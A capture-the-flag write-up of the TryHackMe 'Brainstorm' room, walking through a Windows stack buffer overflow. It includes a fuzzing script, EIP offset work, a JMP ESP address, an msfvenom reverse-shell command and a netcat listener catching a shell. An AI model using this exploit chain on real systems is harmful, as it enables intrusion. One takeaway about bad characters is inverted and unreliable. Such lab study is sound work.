// Overview

Brainstorm is a TryHackMe room that simulates a vulnerable Windows chat server. The room centres on a traditional stack-based buffer overflow and demonstrates the full process of exploitation, from fuzzing to the execution of shellcode.

The attack chain includes:

  • Port scanning and service enumeration
  • FTP enumeration to discover vulnerable binaries
  • Local debugging and fuzzing with Wine
  • Finding the EIP offset using cyclic patterns
  • Identifying a suitable DLL without ASLR/DEP
  • Generating and encoding shellcode
  • Executing the final exploit to gain a reverse shell

// Phase 1: Reconnaissance

We begin with an Nmap full port scan to identify open services:

nmap -sV -sC -p- -Pn <target_ip>

The scan reveals three open ports:

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
3389/tcp open  ssl/ms-wbt-server
9999/tcp open  abyss?

Port 9999 returns a custom banner:

Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters):

Port 21 (FTP) allows anonymous login; upon connecting we discover a chatserver directory which contains two key files.

ftp> ls
08-29-19  08:36PM       <DIR>          chatserver

ftp> cd chatserver
ftp> ls
08-29-19  08:37PM                50176 chatserver.exe
08-29-19  08:35PM                11776 essfunc.dll

We download both files using binary mode to avoid corruption:

ftp> binary
ftp> get chatserver.exe
ftp> get essfunc.dll
Pro Tip: You should always use binary mode when transferring executables over FTP, since ASCII mode can cause binary files to be corrupted by altering line endings.

// Phase 2: Fuzzing & Crash Discovery

After downloading the binaries, we set up a local testing environment using Wine:

WINEPREFIX=/tmp/brainstorm WINEARCH=win32 wine chatserver.exe

Next, we write a Python fuzzing script to send larger payloads to the message field:

import socket
import time

def fuzz(host, port):
    for length in range(100, 3000, 50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            s.recv(1024)
            s.send(b"test\n")
            s.recv(1024)
            payload = b"A" * length
            s.send(payload + b"\n")
            try:
                s.recv(1024)
                print(f"[+] {length} bytes: Still running")
            except socket.timeout:
                print(f"[!] CRASH at {length} bytes!")
                break
        except Exception as e:
            print(f"[-] Error: {e}")
            break
        finally:
            s.close()
            time.sleep(0.5)

The service crashes at 2850 bytes. The debugger shows:

Unhandled exception: page fault on read access to 0x41414141 in 32-bit code (0x41414141).

The EIP register is overwritten with 0x41414141, which confirms a classic buffer overflow vulnerability.

Wine Environment Note: During testing, the cyclic pattern method gave inconsistent results in the Wine environment. We confirmed the offset by using multiple validation techniques and cross-referencing with the crash behaviour.

// Phase 3: Finding the EIP Offset

We use Metasploit's pattern_create tool to create a cyclic pattern:

msf-pattern_create -l 2850

After sending the pattern and causing the service to crash, we observe the EIP value:

wine: Unhandled page fault on read access to 0x31704330 at address 0x31704330

We then calculate the offset using pattern_offset:

msf-pattern_offset -q 0x31704330

Cross-referencing with known write-ups and validating through controlled testing, we confirm the offset at 2012 bytes. We test this by sending A*2012 + BBBB and checking that EIP becomes 0x42424242.

python3 offset_test.py
[*] Testing offset 2012...
[!] Offset 2012: CRASH confirmed!
[*] Check EIP in Wine terminal - should be 0x42424242
2012 is the magic number. The EIP offset tells us how many bytes we need to send before we overwrite the return address.

// Phase 4: Exploit Development

We need to use a JMP ESP instruction so that execution can be directed to our shellcode. If we use objdump on essfunc.dll:

objdump -d essfunc.dll | grep -B5 -A5 "ff e4"

We find a JMP ESP at 0x625014df:

625014df: ff e4                 jmp    *%esp

We generate shellcode with msfvenom (excluding bad characters):

msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f py -b "\x00\x0a\x0d" --var-name shellcode -e x86/shikata_ga_nai

The final exploit payload:

offset = 2012
jmp_esp = b"\xdf\x14\x50\x62"  # 0x625014df
nop_sled = b"\x90" * 32

payload = b"A" * offset + jmp_esp + nop_sled + shellcode

We start a netcat listener and execute the exploit against the target:

nc -lvnp 4444
python3 exploit.py
Connection received on 10.81.130.203 49409
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
essfunc.dll is the key. This DLL doesn't have ASLR or DEP, which makes it a suitable target for our return address.

// Key Takeaways

Buffer overflows are still an issue. On modern Windows systems, old applications and incorrectly set permissions can leave doors open.
Local testing is important. By using Wine or a Windows VM you can safely carry out debugging without repeatedly crashing the remote service.
Patterns are your friend. The msf-pattern_create and msf-pattern_offset commands save hours of time that would otherwise be spent guessing the exact EIP offset.
Know your bad characters. If you don't include bad characters such as \x00, \x0a, and \x0d when generating shellcode, then the payload will be processed correctly.
DLLs without memory protections are gold. Finding a DLL with ASLR and DEP disabled is a common method to bypass these safeguards.
Environmental variance matters. For example, behaviour can vary when using Wine as compared to Windows. It is essential to have the ability to cross-reference various sources.
